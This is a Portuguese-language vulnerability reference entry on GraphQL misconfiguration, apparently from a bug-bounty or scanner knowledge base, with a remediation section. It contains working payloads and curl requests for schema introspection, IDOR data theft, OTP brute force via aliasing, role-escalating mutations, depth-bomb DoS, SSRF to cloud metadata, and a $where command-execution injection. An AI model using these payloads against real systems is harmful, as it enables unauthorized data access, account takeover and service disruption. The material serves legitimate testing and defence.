---
id: graphql_misconfiguration
title: "GraphQL Misconfiguration"
module: "graphql"
severity: "HIGH"
cwe_id: "CWE-200"
cwe_title: "Exposure of Sensitive Information to an Unauthorized Actor"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "server_security_misconfiguration.graphql_misconfiguration"
---

## Summary
Endpoints GraphQL expõem introspection, sugestões de campos, batching sem limite e autorização por campo ausente, permitindo mapear o schema, abusar de IDOR e causar negação de serviço.

## Description
GraphQL oferece um único endpoint que aceita queries arbitrárias. Se a autorização é aplicada apenas no endpoint e não em cada resolver/campo, um usuário autenticado pode consultar dados de outros usuários, acessar campos administrativos ou executar mutações não previstas. Introspection habilitada em produção revela tipos, campos, mutations e argumentos; field suggestions ajudam a descobrir nomes quando introspection está desabilitada.

Riscos adicionais:
- **Batching/aliasing:** múltiplas operações em uma requisição para brute force, enumerar IDs ou contornar rate limit.
- **Query depth/complexity:** queries profundas ou recursivas causam DoS.
- **IDOR em `node(id:)`:** IDs globais opacos podem ser decodificados e manipulados.
- **Mutations sem autorização:** alteração de perfil, role, e-mail, senha e recursos de outros usuários.
- **Debug/GraphiQL expostos:** playground, IDE e erros detalhados.
- **Persisted queries não obrigatórias:** permite queries arbitrárias.

## Impact
- Mapeamento completo do schema e da superfície de ataque.
- Vazamento de dados sensíveis e PII de outros usuários/tenants.
- Escalada de privilégios via mutations e campos administrativos.
- Bypass de rate limit e enumeração massiva com batching.
- Negação de serviço por queries custosas.
- Impacto HIGH; pode ser CRITICAL se houver account takeover ou dump de dados.

## Payloads and Bypasses
```graphql
# Introspection completa
{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } } }

# Tipos e campos
{ __type(name: "User") { name fields { name type { name } } } }

# Field suggestions (quando introspection está off)
{ usr }

# Consulta de outro usuário (IDOR)
{ user(id: "123") { id email role passwordHash } }

# Node interface
{ node(id: "VXNlcjoxMjM=") { ... on User { id email role } } }

# Aliases para enumeração / bypass de rate limit
{
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
}

# Batching (array de operações)
[
  {"query":"{ user(id:\"1\"){email} }"},
  {"query":"{ user(id:\"2\"){email} }"},
  {"query":"{ user(id:\"3\"){email} }"}
]

# Mutation administrativa
mutation { updateUser(id: "123", input: { role: "ADMIN" }) { id role } }

# Depth / DoS
{ user(id:"1") { friends { friends { friends { friends { friends { id } } } } } } }
```

Requisições:
```bash
curl -s https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name } } }"}'

curl -s https://alvo.com/graphql -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <token>' \
  -d '{"query":"{ user(id:\"2\") { id email role } }"}'
```

Bypasses e variações:
```text
- GET com query na URL (?query=...)
- Content-Type: application/graphql
- Introspection parcial: __type, __schema, __typename
- Aliases com nomes aleatórios para evitar assinaturas
- Fragmentos para montar queries sem palavras bloqueadas
- Persisted query hash manipulation
- Batching via array, multipart ou JSON Lines
- Enumerar IDs sequenciais, UUIDv1 e IDs base64
```

HackerOne intel (tecnicas avancadas):
```graphql
-- Introspection bypass via __schema prepend (H1: Enjin #3452015, 75 upvotes)
-- Funciona mesmo quando introspection esta desabilitada
query __schema { __schema { types { name fields { name type { name } } } } }

-- RCE via $where filter injection (sift library) (H1: Mozilla #3782701, $12K, 355 upvotes)
-- Exploita filtros GraphQL que usam sift/MongoDB $where internamente
{ tasks(filter: "{\"$where\": \"process.mainModule.require('child_process').execSync('id')\"}") { id } }

-- Mutation aliasing DoS / brute-force (H1: HackerOne #3287208, $12.5K, 184 upvotes)
-- Uma unica request com centenas de aliases para mutation custosa
mutation {
  a0001: verifyPhone(input:{code:"000001"}) { success }
  a0002: verifyPhone(input:{code:"000002"}) { success }
  a0999: verifyPhone(input:{code:"000999"}) { success }
}

-- Negative cost query para bypass de rate limit (H1: Shopify #481518, 24 upvotes)
{ cheapQuery(first: -100) { nodes { id } } }

-- Field suggestion probe (error message leak de nomes de campo)
{ user { nonexistent_field_xyz } }
-- Response esperado: "Did you mean 'name', 'email', 'passwordHash'?"

-- Cross-tenant IDOR via mutation (H1: TikTok #984965, Stripe #1066203)
mutation { updateAtlasApplicationPerson(input: { id: "OTHER_TENANT_ID", data: {} }) { id } }

-- Introspection via WebSocket nao autenticado (H1: Nuri #862835)
-- WebSocket transport para GraphQL pode bypassar restricoes REST-level
ws://target.com/graphql -> {"type":"start","payload":{"query":"{ __schema { types { name } } }"}}
```

Casos reais e mentalidade de ataque (RWBH): GitHub (IDOR via `node`) e Shopify (introspection) mostram que o endpoint unico concentra autorizacao, enumeracao e batching; o atacante comeca pelo schema e depois testa cada resolver. HackerOne (1033 upvotes) mostra que dados confidenciais de usuarios e metadados de programas sao acessiveis via GraphQL sem autorizacao adequada. Mozilla ($12K) demonstra RCE via $where em filtros GraphQL que usam sift internamente.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `query`, `variables`, `operationName`, `id`, `nodeId`, `input`, `filter`, `first`, `after`, `orderBy`.
- **Paths comuns:** `/graphql`, `/api/graphql`, `/v1/graphql`, `/graphiql`, `/playground`, `/api/v1/graphql`, `/query`.
- **Sinais:** `__schema` acessível; mensagens "Did you mean"; erros com stack trace; endpoint aceita GET; playground habilitado; batching sem limite.

## Escalation Techniques
- **Introspection + IDOR em massa:** usar o schema obtido via introspection para identificar queries com parametros de ID (ex.: `user(id:)`, `order(id:)`, `node(id:)`), depois enumerar IDs sequenciais ou decodificar IDs base64 para acessar dados de outros usuarios -- transforma info disclosure em vazamento massivo de dados.
- **Batching/aliasing + brute force:** abusar de alias queries ou batching para enviar centenas de tentativas de login ou OTP em um unico request HTTP, contornando rate limiting por-request e viabilizando brute force de credenciais.
- **Mutation + mass assignment:** quando a mutation aceita campos nao documentados (ex.: `role`, `isAdmin`, `verified`), enviar esses campos extras para escalar privilegios -- combina GraphQL misconfiguration com mass assignment.
- **Depth bomb + DoS:** construir queries com profundidade recursiva extrema (ex.: `friends { friends { friends { ... } } }`) para causar esgotamento de memoria/CPU no servidor, especialmente quando nao ha complexity limits.
- **GraphQL + SSRF via custom scalars:** quando um campo aceita URLs (ex.: `avatarUrl`, `webhookUrl`) e o servidor faz fetch interno, injetar URLs de servicos internos (`http://169.254.169.254/`, `http://localhost:8080/admin`) para SSRF. H1: EXNESS #1864188 ($3K, 261 upvotes).
- **RCE via $where/sift filter injection** -- Quando o backend usa sift ou operadores MongoDB-like para filtrar dados GraphQL, injetar `$where` com JavaScript malicioso para execucao de comandos no servidor. H1: Mozilla Taskcluster #3782701 ($12K, 355 upvotes) -- RCE nao autenticado.
- **SQLi through GraphQL resolvers** -- Parametros GraphQL passados sem sanitizacao para queries SQL no resolver. Testar com payloads SQLi classicos nos argumentos de queries e mutations. H1: HackerOne #435066 (174 upvotes) -- SQLi via `embedded_submission_form_uuid`.
- **Race condition + persistent access** -- Exploitar race condition entre REST API e GraphQL mutation para reter acesso admin apos transferencia de repositorio. H1: GitHub #2216036 e #2357443 (50+50 upvotes) -- acesso admin covert e persistente.
- **Deactivated user access via GraphQL** -- Usuarios desativados podem reter acesso a dados via endpoint GraphQL quando a desativacao nao invalida sessoes GraphQL. H1: GitLab #1192460 (47 upvotes).
- **Negative cost query bypass** -- Queries com argumentos negativos (ex.: `first: -100`) podem bypassar cost analysis e rate limiting. H1: Shopify #481518 (24 upvotes).
- **Staff permission leak** -- Mutations ou queries administrativas acessiveis por staff sem permissoes explicitas. H1: Shopify #898528 (173 upvotes) -- `AdminGenerateSessionPayload` vazado.

## Hunting Methodology
1. **Descobrir o endpoint GraphQL:** testar paths comuns (`/graphql`, `/api/graphql`, `/v1/graphql`, `/gql`, `/g`, `/query`, `/graphiql`, `/playground`). Verificar tanto POST com `Content-Type: application/json` quanto GET com `?query=`.
2. **Testar introspection:** enviar a query `{ __schema { types { name fields { name } } } }`. Se retornar o schema, documentar todos os tipos, campos e mutations. Se for bloqueada, testar `__type(name:"Query")` e observar mensagens "Did you mean..." para enumerar campos via sugestoes.
3. **Mapear autorizacao por resolver:** para cada query e mutation sensivel, testar com tokens de diferentes niveis de privilegio (usuario normal, admin, sem token). Verificar se e possivel acessar dados de outros usuarios via IDs diretos.
4. **Testar batching e aliasing:** enviar um array de queries ou usar aliases (`a1: user(id:"1") { email } a2: user(id:"2") { email }`) para verificar se rate limiting e aplicado por operacao ou apenas por request HTTP.
5. **Testar depth e complexity:** enviar queries com profundidade crescente (5, 10, 20 niveis) e observar se o servidor rejeita ou se o tempo de resposta cresce exponencialmente. Medir o impacto em latencia.
6. **Verificar mutations nao autorizadas:** tentar executar mutations administrativas (ex.: `updateUser(id:"outro", input:{role:"ADMIN"})`) com token de usuario comum. Verificar se o servidor valida ownership e role no resolver.
7. **Testar introspection bypass via __schema prepend:** se introspection esta desabilitada, tentar `query __schema { __schema { types { name } } }` -- o prefixo `__schema` pode bypassar blacklists.
8. **Testar filter injection ($where/sift):** se queries aceitam argumentos de filtro JSON, injetar operadores MongoDB como `$where`, `$gt`, `$regex` para detectar execucao de JavaScript ou NoSQLi no backend.
9. **Testar via WebSocket transport:** conectar ao endpoint GraphQL via WebSocket (ws:// ou wss://) sem autenticacao e enviar queries. O transport WS pode nao aplicar as mesmas restricoes que REST.
10. **Verificar negative cost queries:** enviar queries com argumentos negativos (`first: -100`, `last: -50`) para verificar se o cost analysis e bypassado.
11. **Testar com usuario desativado:** se possivel, obter token de usuario desativado e testar se o endpoint GraphQL ainda responde -- sessoes GraphQL podem nao ser invalidadas.

## False Positive Indicators
- **Introspection habilitada em ambiente de desenvolvimento:** muitos frameworks habilitam introspection por padrao em dev/staging; se o endpoint nao esta exposto em producao, o finding nao tem impacto real.
- **Schema exposto mas sem dados sensiveis:** a introspection revela tipos e campos, mas todos os resolvers exigem autenticacao e autorizacao adequadas -- o schema em si nao e uma vulnerabilidade se o controle de acesso funciona.
- **Field suggestions sem introspection:** o servidor retorna "Did you mean X?" em mensagens de erro, o que permite enumerar campos lentamente, mas se a autorizacao por resolver e solida, a enumeracao nao leva a vazamento de dados.
- **Batching limitado por configuracao:** o servidor aceita arrays de queries mas aplica rate limiting por operacao dentro do batch e limita o tamanho do array -- o batching existe mas nao e abusavel para brute force.
- **Endpoint GraphQL requer autenticacao forte:** o endpoint exige token valido e todos os campos sensiveis verificam ownership -- mesmo que a introspection esteja ativa, um atacante nao consegue acessar dados de outros usuarios.
- **Negative cost queries rejeitadas:** o servidor valida que argumentos como `first`/`last` sao positivos e rejeita valores negativos.
- **WebSocket GraphQL requer mesma autenticacao que REST:** o transport WebSocket exige token valido no handshake e nao bypassa restricoes de autorizacao.
- **Filter injection sanitizada:** filtros GraphQL que usam sift/$where sanitizam a entrada e nao permitem execucao de JavaScript arbitrario.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2023-26144 | graphql-armor | 2023 | Bypass de character limit protection via aliases -- permite DoS em servidores GraphQL protegidos | DoS via Alias Bypass |
| CVE-2022-37616 | graphql-js | 2022 | Prototype pollution via parsing de query GraphQL malformada -- permite manipulacao de objetos JS no servidor | Prototype Pollution |
| CVE-2024-32651 | Changesets (GitHub Action) | 2024 | GraphQL injection via title de PR permite execucao de mutations arbitrarias no GitHub API | GraphQL Injection |
| CVE-2023-30843 | Payload CMS | 2023 | Introspection habilitada expoe schema completo incluindo fields restritos -- permite bypass de access control | Introspection Leak |
| CVE-2021-41248 | GraphQL Playground | 2021 | XSS via operationName em GraphQL Playground -- execucao de JS arbitrario em contexto de IDE | XSS in GraphQL IDE |

Fonte: cvelistV5 (MITRE CVE List v5 dataset)

## Notable HackerOne Reports

| Report | Programa | Upvotes | Bounty | Tecnica |
|--------|----------|---------|--------|---------|
| #489146 | HackerOne | 1033 | $0 | IDOR -- dados confidenciais de usuarios via GraphQL |
| #3782701 | Mozilla | 355 | $12,000 | RCE via $where/sift em filtros GraphQL |
| #885539 | X/xAI | 346 | $0 | Disclosure de membros de listas privadas |
| #1864188 | EXNESS | 261 | $3,000 | SSRF em query GraphQL |
| #1711938 | GitHub | 198 | $0 | Scoped token escalation via Projects V2 |
| #2207248 | Shopify | 187 | $5,000 | IDOR em BillingDocumentDownload |
| #3287208 | HackerOne | 184 | $12,500 | DoS via mutation aliasing |
| #435066 | HackerOne | 174 | $0 | SQLi via parametro GraphQL |
| #898528 | Shopify | 173 | $0 | Staff permission leak -- AdminGenerateSessionPayload |
| #3452015 | Enjin | 75 | $500 | Introspection bypass via __schema prepend |

## Recommendation
1. Desabilitar introspection e GraphiQL/playground em produção; se necessário, restringir a usuários internos.
2. Desabilitar field suggestions e mensagens de erro detalhadas em produção.
3. Aplicar autorização em cada resolver/campo, com verificação de ownership e tenant; não confiar apenas no token.
4. Implementar allowlist de queries persistidas ou depth/complexity limits; rejeitar queries acima do custo máximo.
5. Limitar batching, aliases e tamanho do body; aplicar rate limit por usuário/IP e por operação.
6. Validar e não expor IDs internos; usar IDs opacos e verificar autorização ao resolver `node(id:)`.
7. Desabilitar mutations administrativas para roles não privilegiadas e auditar alterações.
8. Exemplo de proteção (Apollo Server):
```js
const server = new ApolloServer({
  typeDefs, resolvers,
  introspection: false,
  validationRules: [depthLimit(7), createComplexityLimitRule(1000)],
  plugins: [ApolloServerPluginLandingPageDisabled()],
});
```
9. Monitorar queries anômalas, picos de complexidade e enumeração de IDs.

